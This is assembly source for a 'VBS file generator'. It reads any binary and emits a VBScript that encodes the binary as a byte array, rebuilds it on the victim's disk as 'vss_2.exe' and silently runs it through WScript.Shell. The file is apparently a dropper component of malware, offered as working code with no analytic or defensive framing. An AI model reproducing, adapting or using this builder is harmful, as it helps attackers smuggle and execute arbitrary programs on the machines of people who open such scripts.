; VBS file generator
; #########################################################################

.data
        szVBSFileName   equ     "vss_2.exe"

        szVBSCode1      db      "dim filesys, filetxt, getname, path, textfile, i",13,10
                        db      'textfile = "',szVBSFileName,'"',13,10
                        db      'Set filesys = CreateObject("Scripting.FileSystemObject")',13,10
                        db      'Set filetxt = filesys.CreateTextFile(textfile, True)',13,10
                        db      'getname = filesys.GetFileName(path)',13,10
                        db      'dim a',13,10
                        db      'a=Array(',0

        szVBSCode2      db      ")",13,10
                        db      'for i=0 to ',0

        szVBSCode3      db      13,10,'filetxt.Write(chr(a(i)))',13,10
                        db      'next',13,10
                        db      'filetxt.Close',13,10
                        db      'dim z',13,10
                        db      'dim zz',13,10
                        db      'Const ForReading = 1, ForWriting = 2, ForAppending = 3',13,10
                        db      'const RemoteExe = "',szVBSFileName,'"',13,10
                        db      'set zz = wscript.createobject("wscript.shell")',13,10
                        db      'z = zz.run ("',szVBSFileName,'")',13,10
                        db      'wscript.quit',13,10,0

        szVBSShortFmt   db      "%hu,",0
        szVBSShortFmt2  db      "%hu",0
        szVBSIntFmt     db      "%lu",0

.code

GenVBSCode proc hFileIn, hFileOut, dwInLen: DWORD
        LOCAL   NumStr[20]: BYTE
        LOCAL   Temp: BYTE
        LOCAL   dwTemp, len: DWORD

        invoke  lstrlen, offset szVBSCode1
        xchg    eax, edx
        invoke  WriteFile, hFileOut, offset szVBSCode1, edx, addr dwTemp, NULL

        m2m     len, dwInLen
        .WHILE  len > 0
                invoke  ReadFile, hFileIn, addr Temp, 1, addr dwTemp, NULL
                .IF     len == 1
                        mov     edx, offset szVBSShortFmt2
                .ELSE
                        mov     edx, offset szVBSShortFmt
                .ENDIF
                invoke  wsprintf, addr NumStr, edx, Temp

                invoke  lstrlen, addr NumStr
                xchg    eax, edx
                invoke  WriteFile, hFileOut, addr NumStr, edx, addr dwTemp, NULL
                dec     len
        .ENDW

        invoke  lstrlen, offset szVBSCode2
        xchg    eax, edx
        invoke  WriteFile, hFileOut, offset szVBSCode2, edx, addr dwTemp, NULL

        dec     dwInLen
        invoke  wsprintf, addr NumStr, offset szVBSIntFmt, dwInLen

        invoke  lstrlen, addr NumStr
        xchg    eax, edx
        invoke  WriteFile, hFileOut, addr NumStr, edx, addr dwTemp, NULL

        invoke  lstrlen, offset szVBSCode3
        xchg    eax, edx
        invoke  WriteFile, hFileOut, offset szVBSCode3, edx, addr dwTemp, NULL
        ret
GenVBSCode endp

CreateVBSFile proc uses ebx InFile, OutFile: DWORD
        LOCAL   hFileIn: DWORD
        LOCAL   hFileOut: DWORD

        xor     ebx, ebx

        invoke  CreateFile, InFile, GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL
        mov     hFileIn, eax
        inc     eax
        jz      @cvf_ret

        invoke  CreateFile, OutFile, GENERIC_WRITE or GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL
        mov     hFileOut, eax
        inc     eax
        jz      @cvf_ret

        invoke  GetFileSize, hFileIn, NULL
        invoke  GenVBSCode, hFileIn, hFileOut, eax

        invoke  CloseHandle, hFileIn
        invoke  CloseHandle, hFileOut

        inc     ebx

@cvf_ret:
        mov     eax, ebx
        ret
CreateVBSFile endp
